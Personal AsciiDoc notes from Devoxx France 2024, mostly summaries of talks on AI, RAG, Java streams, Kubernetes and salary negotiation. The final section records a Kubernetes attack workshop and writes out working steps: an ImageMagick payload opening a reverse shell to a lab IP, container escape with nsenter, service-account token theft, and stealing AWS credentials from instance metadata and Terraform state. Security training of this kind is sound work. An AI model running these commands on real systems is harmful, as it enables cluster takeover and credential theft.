= Devoxx France 2024
Damien Cuenot <icon:github[] https://github.com/dcuenot/[GitHub] / icon:twitter[role="aqua"] https://twitter.com/cdams86[@cdams86]>
// Handling GitHub admonition blocks icons
ifndef::env-github[:icons: font]
ifdef::env-github[]
:status:
:outfilesuffix: .adoc
:caution-caption: :fire:
:important-caption: :exclamation:
:note-caption: :paperclip:
:tip-caption: :bulb:
:warning-caption: :warning:
endif::[]
:imagesdir: ./images
:source-highlighter: highlightjs
:highlightjs-languages: asciidoc
// We must enable experimental attribute to display Keyboard, button, and menu macros
:experimental:
// Next 2 ones are to handle line breaks in some particular elements (list, footnotes, etc.)
:lb: pass:[<br> +]
:sb: pass:[<br>]
// check https://github.com/Ardemius/personal-wiki/wiki/AsciiDoctor-tips for tips on table of content in GitHub
:toc: macro
:toclevels: 2
// To number the sections of the table of contents
//:sectnums:
// Add an anchor with hyperlink before the section title
:sectanchors:
// To turn off figure caption labels and numbers
:figure-caption!:
// Same for examples
//:example-caption!:
// To turn off ALL captions
// :caption:

[#img-header] 
.Devoxx France 2024
[link=https://cfp.devoxx.fr/2024/index.html] 
image::header.png[Devoxx France 2024,970,250]



toc::[]

== MERCREDI

=== Présentation du salon

* https://www.devoxx.fr/, du 17 au 19/04/2024
* Et c'est parti pour Devoxx France 2024, ma 5e édition
* Template inspiré par https://twitter.com/thomasschwender[@thomasschwender], merci à lui!
* Doc AsiiDoctor: https://docs.asciidoctor.org/asciidoc/latest/syntax-quick-reference/
* Les talks avec un :movie_camera: dans le titre, sont les talks où je recommande de regarder le replay quand il sera disponible.

=== IA en médecine : où en sommes-nous ?

==== Abstract

.Speakers : Jean-Emmanuel Bibault
----
Les techniques de machine learning sont actuellement utilisées pour entraîner de nombreux modèles en médecine. Pourquoi connaissons-nous un tel âge d'or de l'IA appliquée à la médecine ? 
Cette présentation illustrera l'utilisation de l'IA par différents exemples publiés : prédiction du risque de développer un risque 5 ans à l'avance, interprétation automatisée d'image médicale, détection par Deep Learning de mélanome, prédiction de la survie sur simple scanner, pilotage de robots chirurgicaux, dépistage de la dépression sur instagram, chaque exemple sera expliqué et commenté. Mais l'IA comporte également des risques liés à la gestion des données d'entraînement, aux biais ou encore les attaques adversarielles. Les perspectives de développement à 10 à 15 ans seront enfin abordées pour comprendre comment l'IA va changer la santé de tous.
----

==== Notes

IA en médecine --> anylise d'image, pose de diagnostique (ce qu'on fait déjà)
Tâches de prédiction & de personnalisation (plus difficile car on ne le fait pas déjà en médecine)

En médecine, dataset petits, données très peu structurées --> overfitting
L'effet boîte noire est perturbant en médecine, mais visiblement ça s'arrange

protastecancersurvival.stanford.org

Que peut-on faire à partir d'analyse d'image (deep learning)
Détection du cancer du sein, du poumon / Classification / Monitoring
cheXnet (radio thorax) --> données un peu biaisée, car certaines reconnaissances ce sont basées sur le label de l'hopital sur la radio

Analyse des fonds d'oeil / analyse de photos de grain de beauté
Photos insta pour détecter la dépression
ResNet50 pour détecter des risques de cancer par image satelitte..

IA générative
85* de bonnes réponses au test US pour devenir médecin (mieux que le taux requis)
Commence à avoir de meilleur diagnostic qu'un médecin, et il y a plus d'empathie qu'avec un médecin

Risques
Assez facile de feinter un système de reconnaissance d'image
Biais dans les données
Début de possibilités pour "lire dans les pensées", capacité de reproduire une image à partir d'activité cérébrale


=== Hands-on Gemini, the Google DeepMind LLM

==== Abstract

.Speakers : Mete Atamel & Valentin Deleplace & Guillaume Laforge
----
In this hands-on workshop, you will get to code using Gemini, the new Large Language Model from Google DeepMind. You will first start by familiarizing yourself with the model's capabilities. Then you will use Gemini in different concrete cases, such as extracting data from unstructured text, document classification, but also searching your own documents, or how to supplement the model by integrating the call to external APIs.
The workshop will be conducted using the Java language and the LangChain4j library. Come equipped with a laptop. We will code together in the cloud, no need for any special installation on your machine.
----

==== Notes
AI > Machine Learning > Deep Learning > Generative > Image Gen / LLMs (transformers)
https://s10251.pcdn.co/wp-content/uploads/2024/03/2024-Alan-D-Thompson-AI-Bubbles-Planets-Rev-6.png

Gemma is the open source of Gemini

Workshop based on Vertex AI, and what will do is not fully compatible with Google AI Studio


LangChain4j
Great abstraction and high level
There is a java SDK, but for the workshop we will use LangChain4j

Link to the lab: http://bit.ly/gemini-devoxx-2024


Gemini can speak French, but when I changed the temperature to 1, its creativity disappeard :(
....
Je suis désolé, mais je ne peux pas vous répondre en français car je ne suis pas encore configuré pour cela. 
Je suis toujours en développement et j'apprends de nouvelles choses chaque jour. 
Pour l'instant, je ne peux que répondre en anglais.
....

Gemini is multimodal and can describe images. I did a test with [this one](https://www.devoxx.fr/wp-content/uploads/2023/11/21-1200x630-Facebook-Feed-Image2.png)
....
 The picture shows a robot running in a stadium with a crowd of people watching. 
 The robot is wearing a black and gold suit and has a green light on its chest. 
 The stadium is lit up by bright lights. 
 The picture is taken from a low angle, making the robot look larger than life.
....

Retrieval Augmented Generation (RAG)
_I'm finaly starting what my team is doing.. _

image::indexing_querying.png[Ingestion and Querying]



Function calling
https://github.com/glaforge/gemini-workshop-for-java-developers/blob/main/app/src/main/java/gemini/workshop/MultiFunctionCalling.java


=== Je me suis fait voler la carte de crédit de ma banque en ligne et mon téléphone portable... C'est grave docteur ?

==== Abstract

.Speakers : Patrick Merlin
----
Retour sur un incident de sécurité incluant vol de téléphone.
Le téléphone permet de valider toutes les transactions.
Nous verrons ce qu'il ne faut surtout pas faire pour éviter les pépins !
----

==== Notes

Les retraits DAB ont été remboursés
Les virements faits avec la double d'authentification n'ont pas été remboursé
Si l'opérateur bloque la ligne, les SMS sont toujours distribués

Les codes MFA de secours, ça dépanne toujours

=== Du Clic à la Conversation : remplaçons boutons et formulaires par un LLM !

==== Abstract

.Speakers : Marie-Alice Blete
----
Préparez-vous à voyager dans le domaine de l'interaction homme/machine. Vous connaissez la première révolution : la souris et l'interface graphique ? Nous sommes désormais à l'ère de la deuxième révolution : l'interaction en langage naturel grâce a l'intelligence artificielle.
Dans cette présentation, nous allons metamorphoser une application standard en une application basée sur un LLM. Dites adieu aux boutons et formulaires car nous nous apprêtons à réécrire les règles de l'interface utilisateur !
Nous débuterons par les bases, avec un bref rappel des principes de LLM, suivi d'une première solution exploitant l'API OpenAI. Ensuite, nous verrons deux autres solutions plus avancées, dont une comprenant l'utilisation d'agents avec le framework LangChain.
À la fin de cette présentation, vous disposerez de toutes les connaissances nécessaires pour vous lancer. Vous aurez également une liste d'astuces, de conseils, ainsi qu'une bonne compréhension des écueils pour intégrer des LLM dans vos developpements. Passons du clic à la conversation !
----

==== Notes

https://github.com/malywut/clicks2conversations
https://www.microsoft.com/en-us/research/publication/guidelines-for-human-ai-interaction/


=== Nous sommes tous rassemblés - We are all to gather

==== Abstract

.Speakers : Rémi Forax
----
Java 22 est sorti avec en preview une nouvelle API pour créer soi-même ses propres opérations sur les Streams, un peu comme l'API des collecteurs mais pour les transformations intermédiaires effectuées par un stream.
Je vous propose d'en profiter pour faire un petit retour sur les concepts derrière un Stream, comment cela fonctionne en interne, comment les opérations (parallel/stateful/short-circuit) sont définies. Puis de sauter dans le grand bain et découvrir la nouvelle méthode gather() et l'API des Gatherers et ce que l'on peut faire avec. Enfin, nous verrons les limitations et les améliorations possibles de cette nouvelle API.
----

==== Notes
Stream ?
Spliterator > Filter (Interdemediate op) > FlatMap > toList (Terminal op)
Spliterator push les données (à la différence d'un Iterator qui pull)

A Gather
Objectif implémenter n'importe quelle opération intermediaire
stream.gather(Gatherers.fold(..)).toList()

Modelisation
....
Gatherer<String, ?, String> filter() {
    return Gatherer.of((_, element, downstream) -> {
        if(elemeent.endsWith("1")){
            return downstream.push(element);
        }
        return true;
    })
}
....

Parallel or Sequential
Stateless or Stateful
Short-circuit (peut s'arrêter en cours, ex: limit) vs Greedy (ne peut pas s'arrêter)

jmh pour tester les perfs
Pour l'instant gather est plus lent que les map / mapToInt natif, car ces derniers contiennent des optimisations

API en preview dans java 23



=== :movie_camera: Crafting your own RAG system: Leveraging 30+ LLMs for enhanced performance

==== Abstract

.Speakers : Stephan Janssen
----
In this talk you'll learn how to set up a RAG (Retrieval-Augmented Generation) system against 30+ different Large Language Models using Java.
We'll show you step-by-step how to ingest documents, choose the best text splitter strategies, find similar documents, answer questions, and create a chatbot.
Then, we'll see how to test and compare different AI models, both from open sources and private ones, and whether they are stored on your own computer or accessed online.
You'll walk away knowing how to setup a well balanced RAG system using Java and the best performing and/or cheapest LLM.
----

==== Notes

Embedding --> convert a text to vector
QueryTransformer generate Sub-questions
Agents (or Tools)  can answer directly with data on DB / websites

ReRanker supported: Cohere (cost) + (free one: https://github.com/stephanj/BM25 (troll ;)) )

image::stephan007.jpg[Querying]

*How do we correctly split text?*
To split or not to split? That's the question

window context of 4K to 200K tokens... to 1M tokens
120$ for 1M tokens per query
Response time

Greg Kamradt (youtube) explains how to split
https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.youtube.com/watch%3Fv%3D8OJC21T2SL4&ved=2ahUKEwjDuPSstMmFAxXETKQEHWgYBAMQwqsBegQICxAG&usg=AOvVaw0M6zfJI40tTM5-FIAnltcz

*Vector store*
pgVector / Milvius / Elastic...
Alexander Chatzizacharias
https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.youtube.com/watch%3Fv%3DW-i8bcxkXok&ved=2ahUKEwjokcq9tcmFAxVuUKQEHbkaDr4QtwJ6BAgREAI&usg=AOvVaw27WlIgOmfG3jRGrqY2XIoz

https://github.com/weaviate/weaviate
https://www.anthropic.com/news/claude-3-family

*Embedding*
OpenAI / Nomic / HuggingFace / Cohere v3 (multi language)
All MiniLM L6 V2 / E5 Small V2
https://github.com/stephanj/langchain4j-cohere

/!\ Max input limit

*Evaluate your RAG*
https://github.com/stephanj/rag-genie


== JEUDI

=== Programming's Greatest Mistakes

==== Abstract

.Speakers : Mark Rendle
----
Most of the time when we make mistakes in our code, a message gets displayed wrong or an invoice doesn't get sent. But sometimes when people make mistakes in code, things literally explode, or bankrupt companies, or make web development a living hell for millions of programmers for years to come.
 
Join Mark on a tour through some of the worst mistakes in the history of programming. Learn what went wrong, why it went wrong, how much it cost, and how things can be pretty funny when they're not happening to you.
----

==== Notes

$500,000,000,000 due to Y2K bug, mainly in Mainframe
Y2K22 22220101 can't be parsed as a Long

Pentium FPU (Floating Point Unit)

Null (billion dollars mistake)
issue introduced in Algol W (first language with null)

Bugs in space
In space noone can set a breakpoint

Mars Climtae Orbiter
Orbiter failed due to conversion issue between imperial & metric systems

Ariane 5
Copy paste code btw Ariane 4 & 5, but they changed the processor (moved to 64 bits processor)

Don't trust computer :)


=== Un monde shooté aux métaux

==== Abstract

.Speakers : Agnes Crepet & Guillaume Pitron
------
Dans cette conférence intitulée "Un monde shooté aux métaux", Guillaume Pitron, expert des enjeux géopolitiques liés aux ressources naturelles, et Agnes Crepet, spécialiste en technologies éco-responsables, s'unissent pour aborder la dépendance croissante de nos sociétés aux métaux rares et ses implications profondes. Ils exploreront comment cette consommation excessive impacte l'environnement, l'économie mondiale et les relations sociales, en dévoilant les chaînes d'approvisionnement complexes qui relient les mines isolées aux technologies quotidiennes. La discussion soulignera les conséquences environnementales de l'extraction des métaux, les défis éthiques et les tensions géopolitiques qu'elle engendre.
------

==== Notes



=== Comprendre l'IA: construisez votre propre ChatGPT d'entreprise avec LangChain4J

==== Abstract

.Speakers : Yohan Lasorsa & Julien Dubois & Sandra Ahlgrimm
------
Les technologies d'IA, et particulièrement les grand modèles de langages (LLM) poussent un peu partout comme des champignons ces derniers temps. Comment ces modèles fonctionnent-ils, et comment s'en servir dans vos applications?
Dans ce workshop, nous allons construire de zéro un chatbot basé sur GPT-4 implémentant le pattern Retrieval Augmented Generation (RAG). En utilisant une base de documents de référence, le modèle sera capable de répondre à des questions en langage naturel, et de générer des réponses complètes et sourcées dans vos documents. Pour cela, nous allons créer un service SpringBoot qui s'appuiera sur le framework open-source LangChain4J, ainsi qu'un site web pour tester notre chatbot. Enfin, nous déploierons le tout sur Azure.
   
Au programme:  
- Introduction aux modèles de langage: fonctionnement et limites
- Création d'une base de connaissances: embeddings, BDD vectorielle et recherche par similarité  
- Utilisation de LangChain4J pour implémenter le pattern RAG (Retrieval Augmented Generation)
- Introduction au prompt engineering pour améliorer les performances
- Création d'une API SpringBoot pour interagir avec le modèle
- Création d'un site web pour tester le chatbot
- Déploiement de l'API dockerisée et du site web sur Azure
   
A l'issue du workshop, vous aurez une compréhension plus claire des LLMs ainsi que des idées pour les utiliser. Vous saurez comment créer une base de connaissances et un chatbot fonctionnels, et les déployer dans le cloud.
------

==== Notes

----> Salle comble :( , donc plan B 
https://aka.ms/ws/openai-rag-quarkus


=== GatewayAPI, 10 ans de maturation pour une nouvelle API Kubernetes

==== Abstract

.Speakers : Kevin Davin
------
Exposer une application Kubernetes au monde peut devenir un vrai casse tête 🧐.  
Nous avons d'un côté les API standards avec Ingress, service de `type=LoadBalancer`, voir même les NodePorts… et de l'autre, les APIs custom proposées par les Ingress Controllers et Service-Meshes très avancées mais non standard 😅
Après tant d'années de confusion, une nouvelle API, nommée Gateway API, arrive tout juste en v1.0 (🎉) pour contenter à la fois les développeurs et les opérateurs de cluster ou d'infrastructure 🤯!
Nous découvrirons ensemble cette nouvelle API, ses fonctionnalités avancées et les implémentations qui vous permettrons de les utiliser dans votre cluster ⚡️!
------

==== Notes

Dans Kube il manque des choses, mais il est possible d'en ajouter
NodePort 
>> LoadBalancer 
>> kind: Ingress (fait disparaitre la notion node) pointe vers le service qui pointe vers les nodes
http only, configuration par annotations dans le .yaml, niveau certificat il doit connu par le domain, déploiement complexe
>> Ingress-Controlers (CRD custom): contour
>> Api gateway (CRD custom): Kong, traefik

>> GatewayAPI project
Spec, et pas d'implémentation
4 concepts clés:
* Role Oriented (Infra, cluster operator, Dev)
* Portabilité 
* Extensible (update décorelé du cluster k8s)
* Expressif (HTTProute, GRPCRoute, UDPRoute)

image::k8s.jpg[Gateway]

GatewayClass (Gérer par les personnes de l'infra)

HTTPRoute (Gérer par les dev)

Routage possible multi namespaces
Nouvel object: ReferenceGrant 
ReferenceGrant identifies kinds of resources in other namespaces that are trusted to reference the specified kinds of resources in the same namespace as the policy.

Possible de faire du routing sur du path, des headers HTTP, des query param, RequestMirroring (les appels v2 sont en fire & forget)

Comment on démarre avec la Gateway API
Gateway API: https://gateway-api.sigs.k8s.io/implementations/


=== La recherche à l'ère de l'IA

==== Abstract

.Speakers : David Pilato
------
La recherche ne se contente plus de l'approche maintenant traditionnelle basée sur la fréquence des termes (TF/IDF ou BM25) mais plus sur la tendance actuelle du machine learning où les nouveaux modèles ont ouvert une nouvelle dimension pour la recherche.
Cette conférence donne un aperçu de :
La recherche "Classique" et ses limitations
Qu'est qu'un modèle de machine learning et comment vous pouvez l'utiliser
Comment utiliser la recherche vectorielle ou la recherche hybride dans Elasticsearch
Comment ChatGPT d'OpenAI ou les "large language models" (LLMs) similaires viennent jouer naturellement avec Elastic
Cette session couvre l'état de l'art en matière de recherche de nos jours : BM25, recherche vectorielle, embeddings, recherche hybride, Reciprocal Rank Fusion, intégration avec OpenAI... La démo principale montre comment générer des embeddings à partir de musiques puis comment trouver la musique qui s'approche le plus d'une musique que nous fredonnons.
------

==== Notes

C'est quoi un vecteur?
Elements représentés dans un espace d'embeddings

image::similar_vectors.jpg[Similar Vectors]

Comment on passe des entrées à des vecteurs?
Utilisé des modèles sur étagère (reco) sinon créer son modèle mais attention au use-case

Source data -> pytorch -> post des embeddings dans Elastic (mode free)
Source data -> Elastic ML (inférence faite à l'insertion) -> post des embeddings dans Elastic (mode payant)
https://ela.st/nlp-supported-models

Query --> même modèle qu'à l'indexation --> génère le query vector

Search - query - KNN
Index - mapping - dense_vector

1 + cos(theta) / 2 --> méthode par défaut de calcul de distance
sinon distance euclidienne

HNSW Hierarchical Navigable Small Worlds
----> améliore les perfs

4096 dimensions supportés par Elastic --> mais ca coute cher en IO disk, mémoire (mais c'est hors heap java)
Eviter de faire des recherches pendant les indexations (utilisé des aliases)
Exclure les vecteurs du champs _source (useless pour les users)
Reduire les dimensions
Utiliser des octets au lieu des floats

hybride search
Recherche sur les termes + recherche vectorielle
Une query avec le match (classique) + la recherche knn avec les vecteurs
^ dense vector

ELSER 
sparse_embedding genere des "synonymes" pondéré

RRF (Reciprocal Rank Fusion) - Ranking
On tient compte du rang dans les résultats (on ajoute 60 + rang), et on somme les rangs obtenus par chaque algo

exclude audio_embedding from _source


Demo RAG: Elastic + Cohere
Données du wiki Elastic indexées
Possibilité de faire de la sécurité niveau document (Document level security)

Lien vers la présentation: https://speaker.pilato.fr/WlpZdt

=== Debugguez votre salaire ! Mes stratégies gagnantes pour réussir sa négociation salariale

==== Abstract

.Speakers : Shirley ALMOSNI CHICHE
------
Décortiquer les mystères du salaire, un terrain miné où se mêlent débats enflammés, préjugés persistants et fantasmes insaisissables…

Parfois, tel un mauvais date, vous avez du mal à aller jusqu'au bout d'une proposition convenable à cause de multiples arguments comme « on n'a pas le budget », « on doit respecter la grille salariale » ou encore « vous n'avez pas été assez convainquant techniquement ». J'exposerai donc les points critiques qui vous font souvent obstacle. 

Évidemment ça vous frustre et vous n'êtes pas Jean Claude Dusse : tout ne se joue pas sur un malentendu. Ainsi je vous donnerai les coulisses de la réflexion salariale et les quelques contre-arguments à formuler pour gagner la partie. Tout cela saupoudré de mon analyse du profil des employeurs/interlocuteurs. Je vous parlerai donc des utilisateurs de vos compétences et de leurs freins réels et psychologiques. C'est mon petit côté agile.

Enfin, telle une vétérante du recrutement, je vous dévoilerai une multitude de conseils pratiques pour maîtriser l'art de la négociation salariale. Pour cela, je mettrai en lumière l'importance cruciale de la préparation et de l'anticipation dans cette jungle du recrutement bien avant que la question du salaire ne soit posée sur la table. 

Fini le mystère, place à la stratégie gagnante ! 😘
------

==== Notes

Bugs observés
1. Respect de la grille salariale
2. Traitement équitable (le nouveau va avoir plus que le Tech Lead qui est là depuis 3 ans)
3. Désolé les finances sont compliquées
4. Désolé tu n'as pas le niveau technique
5. Plaisir de négocier
6. Discrimination salariale

Correction de bugs
1. Bien se renseigner sur le package. Rentrer dans le champ lexical de l'interlocuteur
2. Montrer qu'on est prêt à aller au dela du role décrit. Revalorisation fin période d'essai (à mettre dans le contrat de travail)
3. BSPCE, coûts du chasseur de tête, polyvalence
4. Demandé le feedback de l'entretien technique, essayer d'avoir une formation pour arriver au niveau, montrer que l'entretien technique n'a pas mis en valeur mes compétences
5. Pointer les failles / vices dans le projet visé, poser des limites
6. go / nogo, pas simple de savoir quoi faire quand on y fait face.

Miroir, empathie tactique
Fore tranquille: écouter, penser à l'autre

Tips
* Le choix du poste (zone de confort ou alors on s'éloigne ? Secteur qui paie bien ? Poste courtisé ? Localisation ? Equilibre entre offre et demande)
* L'observation (annonce de recrutement, le marché, santé financière, staff & background) - chooseyourboss seyos denis germain levels.fyi
* Face à face RH (apport de la valeur, faits concrets, poser des questions sur le poste)
* Salaire souhaité (méthode Ackerman, chiffre spécifique, donner la marge de flexibilité)
* Rencontre technique (attente priorité pour le poste, quel est format de l'évaluation ? Points de souffrance dans leur quotidien, feedback post-entretien, partage des critiques)
* Equipe (la rencontrer, identifier les personnes influentes)
* Proposition d'embauche (temps de réflexion +/- 48 heures, rester cohérent, contre-offre argumentée sur des faits + bon timing
)




== VENDREDI

=== Comment modéliser l'état du monde en 2100 ? Le Rapport Meadows

==== Abstract

.Speakers : Anatole Chouard
----
Comment modéliser l'état du monde en 2100 ? Pas la question la plus simple ! Mais en 1972 un groupe de chercheurs du MIT a essayé de répondre à cette question : c'est le fameux et fascinant rapport Meadows. Et ils ont compris bien des choses avant tout le monde. Dans cette conférence interactive, je vous fais un résumé en 20 minutes de la méthode et surtout des résultats du rapport Meadows !
----

==== Notes

Rapport Meadows

Identifier les systèmes majeur
Alimentaire / industriel / population / pollution / ressources (renouvelable - non-renouv)

Interaction entre systèmes

Quantifier les interactions

Courbes des évolutions (l'important c'est la forme des courbes, pas les valeurs)

=== Cybersécurité et cyberdéfense : un sujet géopolitique

==== Abstract

.Speakers : Guillaume Poupard
----
La cybersécurité est souvent vue, à juste titre, sous un angle technique, opérationnel et réglementaire. L'incroyable évolution de la menace informatique nous concerne tous, à titre individuel, au niveau des organisations mais également à l'échelle des Etats. Dans un contexte général de fortes tensions géopolitiques, le cyber est devenu un ingrédient majeur dont l'usage se systématise dans des conflits qualifiés « d'hybrides ». Passionnante et effrayante, cette militarisation de l'espace numérique nous concerne toutes et tous !
----

==== Notes

80% du temps passé à l'ANSII, c'est pas sur la cybersec mais l'espionnage
Bureaux des légendes une bonne référence
Espionnage le vrai plus vieux métier du monde :)

Attaquants très discrets
Victimes ne s'en rendent pas compte (ça prend des mois voire des années pour le découvrir)

Cyber devenu un sujet géopolique
Possibilité de paraliser des systèmes / états entier

Livre blanc 2008
https://fr.wikipedia.org/wiki/Livre_blanc_sur_la_défense_et_la_sécurité_nationale_2008#:~:text=Le%20Livre%20blanc%20sur%20la,France%20de%202009%20à%202020.

En France, on a un problème, donc on en fait une loi
Les OIV doivent se protéger des attaques cyber
12 secteurs dans les OIV
* Énergie
* Transports
* Eau
* Santé
* Télécommunications
* Défense
* Finances
* Alimentation
* Technologies de l'information et de la communication
* Recherche
* Industrie chimique
* Espace

Cyber attaque TV5 Monde 2015
Attribuer une attaque à qqun c'est qqch de très difficile
Source au final --> l'Est

2017 - Wannacry
GB le service de santé s'est bloqué

Notpetya
Efface les données, donc pas vraiment un rancçngiel
Visait princiapelement l'Ukraine
Saint Gobbin impacter par Notpetya, usine en Ukraine opérait une usine là-bas (bien que vendu 2 ans auparavant)
Ukraine toujours attaqué par l'Est maintenant, mais a su mieux se protéger


=== Si j'étais un hacker, comment est-ce que je prendrais le contrôle de votre cluster Kubernetes

==== Abstract

.Speakers : Thibault Lengagne & Alexandre Hervé
----
Un cluster Kubernetes est un orchestrateur de conteneurs qui permet de déployer et de gérer des applications de manière efficace. Cependant, en raison de sa complexité, un tel cluster peut facilement être vulnérable aux attaques et sa sécurité peut être compromise. Pour éviter cela, la meilleure option reste de tester ses défenses en se mettant dans la peau d'un attaquant !
Devenez vous-même un hacker pour la durée de cet atelier. Vous allez réaliser les différentes étapes de compromission un cluster Kubernetes et du compte AWS sous-jacent. Nous aborderons différentes techniques d'attaques en commençant par l'exécution de commandes sur un pod puis, grâce à différentes élévations de privilège, la compromission totale du cluster. Nous mettrons également en place des mesures préventives dans le but d'empêcher ces différentes failles de sécurité d'être exploitées.
----

==== Notes

https://www.microsoft.com/en-us/security/blog//wp-content/uploads/2020/04/k8s-matrix.png


Ecoute sur l'attaque box
....
nc -lvnp 50986
....

Créer une image avec l'exploit
....
$ cat exploit.mvg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|setsid /bin/bash -i >/dev/tcp/10.100.1.188/50986 0<&1 2>&1 &")'
pop graphic-context
....

Dans le shell interactif
....
python -c 'import pty; pty.spawn("/bin/bash")'
Press Ctrl+Z
$ stty raw -echo
Press fg and then Enter
....

Une fois connecté dans le pod:
Lister les process
....
ps aux
....

Lister les capacités du container
....
capsh --print
....

Pour sortir du container et aller sur node:
....
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
....

Lister les containers ou les points de montage
....
ctr -n k8s.io c list
mount | grep kube
....

....
#!/bin/bash

# Download kubectl
cd /tmp/
curl -LO https://storage.googleapis.com/kubernetes-release/release/`curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt`/bin/linux/amd64/kubectl
chmod +x ./kubectl
mv ./kubectl /bin
alias kubectl="kubectl  --server=https://$KUBERNETES_SERVICE_HOST --token=$TOKEN --insecure-skip-tls-verify=true"

# Tries all the token found to access kube-api
# Tries to get the secrets using each token

# for path in $(mount | grep kube-api | awk '{print $3}'); do
#   TOKEN=$(cat $path/token);
#   echo "==================================="
#   echo $TOKEN;
#   echo "Service account : $(python /tmp/decode_jwt_token.py $path/token | jq -r '.sub')"
#   echo "-----------------------------------"
#   kubectl get secrets -A;
#   echo "==================================="
# done

# Look for admin token
ctr -n k8s.io container list
PID=$(ctr -n k8s.io container list | grep nginx | awk '{print $1}')
crictl exec -it $PID /bin/sh

# Get token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Two tokens should work the ingress controller service account and the busybox service account
export TOKEN=<...>

# You can list but not read
kubectl get secrets -n kube-system --token=$TOKEN

# Tips add -o yaml pour avoir la sortie
....


Attack AWS
....
#!/bin/bash

#
# On the node shell
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`

# Explore API
curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/

# Get name of the role
node_group=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/iam/security-credentials/)

# Get the role
curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/iam/security-credentials/$node_group -o creds.json

# Export the body of your response in a json file and save it on your local machine
# Use the python script to obtain the format of the aws credentials
python /tmp/export-credentials-aws.py creds.json

# Get cluster name and API Endpoint
curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/user-data


# # Install AWS
# curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
# python -c "import zipfile; zip_ref=zipfile.ZipFile('awscliv2.zip', 'r');zip_ref.extractall('/tmp/')"
# chmod +x ./aws/install
# ./aws/install
# chmod +x /usr/local/bin/aws
# export AWS_PAGER=""

# GO to your machin

# List bucket
aws s3api list-buckets
aws s3 cp s3://devoxx-eks-attack-terraform-backend/poc /tmp/state.json

cat /tmp/state.json| jq '.resources[].name'  | grep admin
cat /tmp/state.json| jq '.resources[] | select (.name == "admin_user_access_key")'



unset AWS_SECRET_ACCESS_KEY
unset AWS_ACCESS_KEY_ID
unset AWS_SESSION_TOKEN
export AWS_ACCESS_KEY_ID=$(cat /tmp/state.json| jq '.resources[] | select (.name == "admin_user_access_key")' | jq -r '.instances[].attributes.id')
export AWS_SECRET_ACCESS_KEY=$(cat /tmp/state.json| jq '.resources[] | select (.name == "admin_user_access_key")' | jq -r '.instances[].attributes.secret')

aws iam list-users

# Delete the key to prevent exploitation
aws iam delete-access-key --access-key-id "<key>" --user-name admin-test
....


Pour se défendre --> Falco
https://falco.org

imds v2 pour éviter plusieurs risques de sécu: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html

Pas de containers priviligés melangés avec des containers non priviligiés
Les mettre sur des nodes dédiés

